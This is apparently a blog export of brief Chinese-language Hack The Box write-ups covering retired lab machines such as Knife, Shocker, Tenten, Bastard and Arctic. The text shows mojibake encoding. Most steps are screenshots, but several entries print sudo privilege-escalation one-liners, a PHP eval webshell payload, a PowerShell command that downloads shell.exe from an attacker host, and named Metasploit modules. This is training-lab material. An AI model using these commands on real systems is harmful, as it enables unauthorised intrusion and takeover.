<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>ä½¿ç”¨sudo -l æŸ¥çœ‹æœ‰å“ªäº›å¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œæ‰¾åˆ°ä¸€ä¸ªknife</p>
<img src="/Hackthebox/htb/htb-knife/image-20250216111432749.png" class="" title="ææƒ">

<p>è¿è¡Œä¸€ä¸‹knifeï¼Œå‘ç°å¯ä»¥æ‰§è¡Œå‘½ä»¤</p>
<img src="/Hackthebox/htb/htb-knife/image-20250216112140995.png" class="" title="knife">

<p>ä½¿ç”¨<code>sudo knife exec --exec &quot;exec &#39;/bin/sh -i &#39;&quot;</code> æˆåŠŸææƒ</p>
<img src="/Hackthebox/htb/htb-knife/image-20250216112920949.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;james&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>åé—¨</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Shocker</title>
    <url>/Hackthebox/htb/htb-shocker/</url>
    <content><![CDATA[<style>.ecjqlwzlligd{zoom:50%;}</style><img src="/Hackthebox/htb/htb-shocker/efef52a0fb63d9c8db0ab6e50cb6ac79.png" class="ecjqlwzlligd">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Linux</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-shocker/image-20250216093127462.png" class="" title="Nmap">

<p>å¼€æ”¾äº†80(HTTP) å’Œ2222(SSH)</p>
<h3 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><p>ä½¿ç”¨dirbè¿›è¡Œç›®å½•çŒœè§£ï¼Œå‘ç° <code>/cgi-bin/</code>ç›®å½•</p>
<img src="/Hackthebox/htb/htb-shocker/image-20250216095828722.png" class="" title="dirb">

<p>ç„¶åä½¿ç”¨Fuff ç»§ç»­çŒœè§£ï¼Œæ‰¾åˆ°ä¸€ä¸ª <code>user.sh</code></p>
<img src="/Hackthebox/htb/htb-shocker/image-20250216095724470.png" class="" title="Fuff">

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>ä½¿ç”¨msfconsole <code>multi/http/apache_mod_cgi_bash_env_exec</code> æ¨¡å—</p>
<img src="/Hackthebox/htb/htb-shocker/image-20250216101417329.png" class="" title="GetShell">



<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>ä½¿ç”¨sudo -l å‘ç°å¯ä»¥åˆ©ç”¨perl è¿›è¡Œææƒ <code>sudo /usr/bin/perl -e &#39;exec &quot;/bin/bash&quot;&#39;</code></p>
<img src="/Hackthebox/htb/htb-shocker/image-20250216103049798.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;shelly&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>Shellshock</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Tenten</title>
    <url>/Hackthebox/htb/htb-tenten/</url>
    <content><![CDATA[<style>.ksukyplnfoyo{zoom:50%;}</style><img src="/Hackthebox/htb/htb-tenten/e58a465e93364c423cd2162945f8f7bf.png" class="ksukyplnfoyo">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Linux</td>
<td align="left">Medium</td>
</tr>
</tbody></table>
<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><img src="/Hackthebox/htb/htb-tenten/image-20250215132349182.png" class="" title="Nmap">

<p>å¼€æ”¾äº†80ç«¯å£ï¼Œæ·»åŠ åŸŸåè§£æåˆ°hostsæ–‡ä»¶</p>
<pre class="language-none"><code class="language-none">$ echo &#39;10.10.10.10 tenten.htb&#39; | sudo tee -a &#x2F;etc&#x2F;hosts</code></pre>

<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p>ä½¿ç”¨whatwebè¯†åˆ«ç«™ç‚¹æŒ‡çº¹ï¼Œç›®æ ‡ä¸ºWordPress</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215132915851.png" class="" title="whatweb">

<p>ç‚¹å¼€æ–‡ç« ï¼Œè·å¾—ä¸€ä¸ªç”¨æˆ·å(takis)ï¼Œå¤‡ç”¨</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215151109164.png" class="" title="ä¿¡æ¯æ”¶é›†">

<h3 id="æ¼æ´æ‰«æ"><a href="#æ¼æ´æ‰«æ" class="headerlink" title="æ¼æ´æ‰«æ"></a>æ¼æ´æ‰«æ</h3><p>æ ¹æ®è·å–åˆ°çš„æŒ‡çº¹ï¼Œä½¿ç”¨wpscanè¿›è¡Œæ‰«æï¼Œæ–°ç‰ˆwpscan è¦æƒ³è·å¾—æ¼æ´ä¿¡æ¯ï¼Œéœ€è¦åœ¨å®˜ç½‘æ³¨å†Œè´¦å·ï¼Œç„¶åæŒ‡å®šapk-token</p>
<pre class="language-none"><code class="language-none">wpscan  --url tenten.htb  --api-token WRH0ACCYJIBtqTKdxxxxxxxxxxLy1ZWzsAcxa8fA3s4</code></pre>

<img src="/Hackthebox/htb/htb-tenten/image-20250215144154195.png" class="" title="æ¼æ´æ‰«æ">

<p>é€šè¿‡Fuzz å¯ä»¥æ‰¾åˆ°ä¸€ä¸ª<code>/index.php/jobs/apply/13/</code>é¡µé¢è·å–åˆ°æ ‡é¢˜</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215143621824.png" class="" title="ä¿¡æ¯æ”¶é›†">

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>åœ¨githubå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªCVE-2015-6668çš„Python2è„šæœ¬ï¼Œéœ€è¦å°†è„šæœ¬è¯­æ³•æ”¹æˆPython3</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215144333970.png" class="" title="æ¼æ´åˆ©ç”¨">

<p>è¿™å¼ å›¾ç‰‡è¢«éšå†™äº†ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨<code>steghide</code> è¿›è¡Œæå–</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215145349051.png" class="" title="æå–ä¿¡æ¯">

<p>ä½¿ç”¨<code>john</code>è¿›è¡Œå¯†ç ç ´è§£</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215151629727.png" class="" title="ç ´è§£å¯†ç ">

<p>ä¿®æ”¹ <code>id_rsa</code> æƒé™ï¼Œç„¶åä½¿ç”¨æœ€å¼€å§‹æ”¶é›†åˆ°çš„ç”¨æˆ·åå’Œç ´è§£å‡ºæ¥çš„å¯†ç è¿›è¡Œssh ç™»å½•</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215151534084.png" class="" title="Getshell">

<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>è¿è¡Œsudo -l å‘ç°ä¸€ä¸ªè„šæœ¬ï¼Œç›´æ¥è¿è¡Œè„šæœ¬å³å¯ææƒ</p>
<img src="/Hackthebox/htb/htb-tenten/image-20250215152404422.png" class="" title="ä¿¡æ¯æ”¶é›†">

<img src="/Hackthebox/htb/htb-tenten/image-20250215152228863.png" class="" title="Getshell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td>&#x2F;home&#x2F;takis&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td>&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>ä¿¡æ¯æ”¶é›†</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Bastard</title>
    <url>/Hackthebox/htb/htb-bastard/</url>
    <content><![CDATA[<style>.eyqusspcwaty{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bastard/a8d2ae87fbe6d1ccfe93522d74defb3a.png" class="eyqusspcwaty">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Windows</td>
<td align="left">Medium</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-bastard/image-20250215103413869.png" class="" title="Nmap">

<p>å¼€æ”¾80ã€135å’Œ49154ç«¯å£ï¼Œå¹¶ä¸”80ç«¯å£å‘ç°ä¸€äº›ç›®å½•å’Œæ–‡ä»¶ï¼Œæ·»åŠ åŸŸåè§£æåˆ°hostsæ–‡ä»¶</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.9 bastard.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>

<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p>è®¿é—® <code>/CHANGELOG.txt</code> å‘ç° CMS ä¸º <code>Drupal 7.54</code> </p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215105400323.png" class="" title="ä¿¡æ¯æ”¶é›†">

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>ä½¿ç”¨searchsploit æ£€ç´¢å¯ç”¨exp</p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215112934416.png" class="" title="searchsploit">

<p> ä¿®æ”¹è„šæœ¬ï¼Œå¹¶ä½¿ç”¨payload <code>&#39;data&#39; =&gt; &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;</code> ï¼Œè¿è¡Œè„šæœ¬</p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215125354575.png" class="" title="ä¿®æ”¹è„šæœ¬">

<img src="/Hackthebox/htb/htb-bastard/image-20250215114456579.png" class="" title="exp">

<p>é…ç½®èšå‰‘ï¼Œè¿æ¥webshell</p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215125510849.png" class="" title="è¿æ¥webshell">

<p>å°†webshellè½¬æ¢ä¸ºmsfconsoleï¼Œå…ˆç”Ÿæˆexe ç„¶åä½¿ç”¨èšå‰‘ä¸Šä¼ å¹¶æ‰§è¡Œexe</p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215122000088.png" class="" title="ç”Ÿæˆpayload">

<img src="/Hackthebox/htb/htb-bastard/image-20250215125046135.png" class="" title="ä¸Šä¼ exeå¹¶æ‰§è¡Œ">

<img src="/Hackthebox/htb/htb-bastard/image-20250215122253560.png" class="" title="GetShell">

<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>ä½¿ç”¨local_exploit_suggester è„šæœ¬è¿›è¡Œä¿¡æ¯æ”¶é›†</p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215122221334.png" class="" title="æ”¶é›†ææƒä¿¡æ¯">

<p>ä½¿ç”¨ <code>exploit/windows/local/ms15_051_client_copy_image</code> è¿›è¡Œæƒé™æå‡</p>
<img src="/Hackthebox/htb/htb-bastard/image-20250215122939518.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Users\dimitris\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Granny</title>
    <url>/Hackthebox/htb/htb-granny/</url>
    <content><![CDATA[<style>.ibuszggulpxu{zoom:50%;}</style><img src="/Hackthebox/htb/htb-granny/e8a122e2d713a4fb4a180bb9ccd20248.png" class="ibuszggulpxu">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-granny/image-20250212204730377.png" class="" title="Nmap">

<p>å¼€æ”¾80(IIS 6.0) ç«¯å£å¹¶ä¸”å¼€å¯äº†webdav</p>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>ä½¿ç”¨msf <code>windows/iis/iis_webdav_upload_asp</code> æ¨¡å—è¿›è¡Œæ¼æ´åˆ©ç”¨</p>
<img src="/Hackthebox/htb/htb-granny/image-20250212210017947.png" class="" title="GetShell">

<p>è¿ç§»è¿›ç¨‹</p>
<img src="/Hackthebox/htb/htb-granny/image-20250212210739530.png" class="" title="è¿›ç¨‹">

<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>ä½¿ç”¨local_exploit_suggester æ¨¡å—è¿›è¡Œä¿¡æ¯æ”¶é›†</p>
<img src="/Hackthebox/htb/htb-granny/image-20250212205939579.png" class="" title="ä¿¡æ¯æ”¶é›†">

<p>ä½¿ç”¨ms15-051 è¿›è¡Œææƒ</p>
<img src="/Hackthebox/htb/htb-granny/image-20250212210630257.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Documents and Settings\Lakis\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Documents and Settings\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>IIS</tag>
        <tag>é…ç½®é”™è¯¯</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Grandpa</title>
    <url>/Hackthebox/htb/htb-grandpa/</url>
    <content><![CDATA[<style>.zdvjkcsbrypt{zoom:50%;}</style><img src="/Hackthebox/htb/htb-grandpa/381683fd107da11f1dc916401ae8aee0.png" class="zdvjkcsbrypt">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Windows</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-grandpa/image-20250212200523195.png" class="" title="Nmap">

<p>å‘ç°80(IIS 6.0) ç«¯å£</p>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>ä½¿ç”¨msfconsole <code>windows/iis/iis_webdav_scstoragepathfromurl</code> æ¨¡å—è¿›è¡Œæ¼æ´åˆ©ç”¨</p>
<img src="/Hackthebox/htb/htb-grandpa/image-20250212201611096.png" class="" title="GetShell">

<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>ä½¿ç”¨ <code>local_exploit_suggester</code> æ¨¡å—è¿›è¡Œæœ¬åœ°ææƒçš„ä¿¡æ¯æ”¶é›†  </p>
<img src="/Hackthebox/htb/htb-grandpa/image-20250212202135579.png" class="" title="ä¿¡æ¯æ”¶é›†">

<p>ä½¿ç”¨  <code>windows/local/ms14_070_tcpip_ioctl</code> è¿›è¡Œæƒé™æå‡ï¼Œææƒå¤±è´¥</p>
<img src="/Hackthebox/htb/htb-grandpa/image-20250212202811599.png" class="" title="ææƒ">

<p>åˆ—å‡ºè¿›ç¨‹ï¼Œè¿ç§»è¿›ç¨‹ <code>migrate 3100</code>ï¼Œç„¶åé‡æ–°ææƒ</p>
<img src="/Hackthebox/htb/htb-grandpa/image-20250212202917826.png" class="" title="è¿›ç¨‹">

<img src="/Hackthebox/htb/htb-grandpa/image-20250212203009824.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th>Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td>Flag1</td>
<td align="left">C:\Documents and Settings\Harry\Desktop\user.txt</td>
</tr>
<tr>
<td>Flag2</td>
<td align="left">C:\Documents and Settings\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>IIS</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Arctic</title>
    <url>/Hackthebox/htb/htb-arctic/</url>
    <content><![CDATA[<style>.wfpyfrhbnxms{zoom:50%;}</style><img src="/Hackthebox/htb/htb-arctic/0d6275efbd5e48fcdc96e61b9724ae5e.png" class="wfpyfrhbnxms">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Windows</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-arctic/image-20250202222155508.png" class="" title="Nmap">

<p>è®¿é—®10.10.10.11:8500ï¼Œå‘ç°ä¸€ä¸ªç›®å½•åˆ—è¡¨ï¼Œæ‰¾åˆ°ä¸€ä¸ªåå°é¡µé¢ <code>/CFIDE/administrator</code> å¯ä»¥çœ‹åˆ°ç‰ˆæœ¬æ˜¯8</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203110808681.png" class="" title="ç›®å½•åˆ—è¡¨">

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>ä½¿ç”¨searchsploitæ£€ç´¢coldfusion 8 æ‰¾åˆ°ä¸€ä¸ªRCEï¼Œå¤åˆ¶expåˆ°å½“å‰ç›®å½•</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203111301420.png" class="" title="searchsploit">

<img src="/Hackthebox/htb/htb-arctic/image-20250203111746331.png" class="" title="å¤åˆ¶æ–‡ä»¶åˆ°å½“å‰ç›®å½•">

<p>ä¿®æ”¹expé‡Œé¢çš„IPåœ°å€ï¼Œç„¶åæ‰§è¡Œè„šæœ¬ï¼ŒæˆåŠŸè·å–åˆ°shell</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203111813277.png" class="" title="GetShell">

<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>æŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿä¿¡æ¯ï¼ŒWindows Server 2008 R2 x64 </p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203112144909.png" class="" title="ä¿¡æ¯æ”¶é›†">

<p>ä½¿ç”¨msfç”Ÿæˆä¸€ä¸ªåé—¨ï¼Œåˆ©ç”¨è·å–åˆ°çš„shell ä¸‹è½½å¹¶æ‰§è¡Œ</p>
<p><code>powershell &quot;(new-object System.Net.WebClient).Downloadfile(&#39;http://10.10.16.10:8000/shell.exe&#39;,&#39;shell.exe&#39;)&quot;</code></p>
<p>msfconsoleè·å–shellæˆåŠŸ</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203114209620.png" class="" title="GetShell">

<p>ä½¿ç”¨msfçš„ms10-092 è„šæœ¬è¿›è¡Œææƒï¼Œæç¤ºæŠ¥é”™éœ€è¦x64 çš„meterpreter</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203132850659.png" class="" title="æŠ¥é”™">

<p>æŸ¥æ‰¾x64 çš„è¿›ç¨‹è¿›è¡Œè¿ç§»</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203132941496.png" class="" title="æŸ¥çœ‹è¿›ç¨‹">

<p>è¿ç§»æˆåŠŸï¼Œé‡æ–°æ‰§è¡Œææƒè„šæœ¬ï¼ŒæˆåŠŸææƒ</p>
<img src="/Hackthebox/htb/htb-arctic/image-20250203133216230.png" class="" title="è¿ç§»è¿›ç¨‹">

<table>
<thead>
<tr>
<th>Flag</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td>Flag1</td>
<td>C:\Users\tolis\Desktop\user.txt</td>
</tr>
<tr>
<td>Flag2</td>
<td>C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Legacy</title>
    <url>/Hackthebox/htb/htb-legacy/</url>
    <content><![CDATA[<style>.rvyxwilvvdki{zoom:50%;}</style><img src="/Hackthebox/htb/htb-legacy/60dc190c4c015cfe3a3aef9b5afca254.png" class="rvyxwilvvdki">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-legacy/image-20250201192659015.png" class="" title="Nmap">

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>ä¸€ä¸ªå¼€äº†445ç«¯å£çš„Windows XPï¼Œå¯ä»¥è¯•è¯•ms08067</p>
<img src="/Hackthebox/htb/htb-legacy/image-20250201193355321.png" class="" title="msfconsole">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Documents and Settings\john\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Documents and Settings\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Devel</title>
    <url>/Hackthebox/htb/htb-devel/</url>
    <content><![CDATA[<style>.kysyfqyvjeqq{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devel/0fb6455a29eb4f2682f04a780ce26cb1.png" class="kysyfqyvjeqq">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Windows</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h3><img src="/Hackthebox/htb/htb-devel/image-20250201213314487.png" class="" title="Nmap">

<p>å‘ç°ä¸¤ä¸ªå¼€æ”¾ç«¯å£ 21å’Œ80ï¼ŒFTPå…è®¸åŒ¿åç™»å½•ï¼Œå…ˆç™»å½•FTPçœ‹çœ‹ï¼ŒFTPçš„ç›®å½•åº•ä¸‹æ˜¯ä¸»ç«™ç‚¹çš„æ–‡ä»¶</p>
<style>.nutausufzomm{zoom:150%;}</style><img src="/Hackthebox/htb/htb-devel/image-20250201213757511.png" class="nutausufzomm" alt="ç™»å½•FTP">

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>ç”Ÿæˆä¸€ä¸ªwebshellç„¶åé€šè¿‡ftpä¸Šä¼ </p>
<img src="/Hackthebox/htb/htb-devel/image-20250201215256322.png" class="" title="ç”Ÿæˆwebshell">

<img src="/Hackthebox/htb/htb-devel/image-20250201215437794.png" class="" title="ä¸Šä¼ FTPæˆåŠŸ">

<p>è®¿é—®webshellï¼ŒæˆåŠŸæ¥æ”¶åˆ°shell</p>
<img src="/Hackthebox/htb/htb-devel/image-20250201215830245.png" class="" title="GetShell">

<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼Œæ˜¯ä¸ªwin7ï¼Œä½¿ç”¨ms10-015ï¼ŒææƒæˆåŠŸ</p>
<img src="/Hackthebox/htb/htb-devel/image-20250201220950888.png" class="" title="sysinfo">

<img src="/Hackthebox/htb/htb-devel/image-20250201220847566.png" class="" title="ææƒæˆåŠŸ">

<table>
<thead>
<tr>
<th>flag</th>
<th>path</th>
</tr>
</thead>
<tbody><tr>
<td>flag1</td>
<td>C:\Users\babis\Desktop\user.txt</td>
</tr>
<tr>
<td>flag2</td>
<td>C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Lame</title>
    <url>/Hackthebox/htb/htb-lame/</url>
    <content><![CDATA[<style>.phpcudztjjcy{zoom:50%;}</style><img src="/Hackthebox/htb/htb-lame/fb2d9f98400e3c802a0d7145e125c4ff.png" class="phpcudztjjcy">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Linux</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><style>.npslhhfjobob{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201155450222.png" class="npslhhfjobob" alt="Nmap">

<p>å‘ç°ä¸¤ä¸ªå¯ç–‘æœåŠ¡21(vsftpd 2.3.4)å’Œ445(Samba 3.0.20)ï¼Œä½¿ç”¨searchsploit æ£€ç´¢å¯ç”¨exp<img src="/Hackthebox/htb/htb-lame/image-20250201160141376.png" class="" title="searchploit"></p>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>ä½¿ç”¨vsftpdçš„æ¼æ´ï¼Œå¤±è´¥ï¼Œæ¢smbæ¼æ´, æˆåŠŸ</p>
<style>.saofcxyshdwm{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201174838005.png" class="saofcxyshdwm" alt="msfconsole">

<img src="/Hackthebox/htb/htb-lame/image-20250201175040335.png" class="" title="searchsploit">

<img src="/Hackthebox/htb/htb-lame/image-20250201175515940.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td>&#x2F;home&#x2F;makis&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td>&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Optimum</title>
    <url>/Hackthebox/htb/htb-optimum/</url>
    <content><![CDATA[<style>.waukpbkgjcws{zoom:50%;}</style><img src="/Hackthebox/htb/htb-optimum/bb09ffeaffe2f5220a1d591bb7b4f95e.png" class="waukpbkgjcws">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
